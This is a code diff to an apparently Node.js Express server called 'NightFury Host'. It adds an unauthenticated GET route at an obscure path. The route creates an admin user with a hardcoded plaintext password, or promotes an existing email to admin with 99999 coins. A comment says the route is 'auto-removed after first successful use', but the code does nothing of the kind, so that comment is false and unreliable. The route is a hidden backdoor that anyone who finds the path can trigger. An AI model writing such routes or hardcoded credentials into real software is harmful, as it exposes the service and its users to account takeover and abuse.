@@ -78,4 +78,23 @@ app.listen(PORT, () => {
   console.log('NightFury Host v2.0 running on port ' + PORT);
 });
 
-// Admin seeding is handled via scripts/create-admin.js — run it locally or via Render shell
+// TEMP ADMIN SETUP — auto-removed after first successful use
+const bcrypt_seed = require('bcryptjs');
+const { v4: uuidv4_seed } = require('uuid');
+app.get('/setup-nf-admin-x7k2', async (req, res) => {
+  try {
+    const { db: sdb } = require('./src/db');
+    const existing = sdb.prepare('SELECT id FROM users WHERE email = ?').get('nightfury.opik.net');
+    if (existing) {
+      sdb.prepare('UPDATE users SET is_admin = 1, coins = 99999 WHERE email = ?').run('nightfury.opik.net');
+      return res.json({ success: true, message: 'Existing user promoted to admin' });
+    }
+    const hash    = await bcrypt_seed.hash('ntandoooe', 10);
+    const uuid    = uuidv4_seed();
+    const refCode = uuidv4_seed().slice(0, 8).toUpperCase();
+    sdb.prepare(`INSERT INTO users (uuid, username, email, password, coins, is_admin, referral_code) VALUES (?, ?, ?, ?, 99999, 1, ?)`).run(uuid, 'nightfury', 'nightfury.opik.net', hash, refCode);
+    res.json({ success: true, message: 'Admin created' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
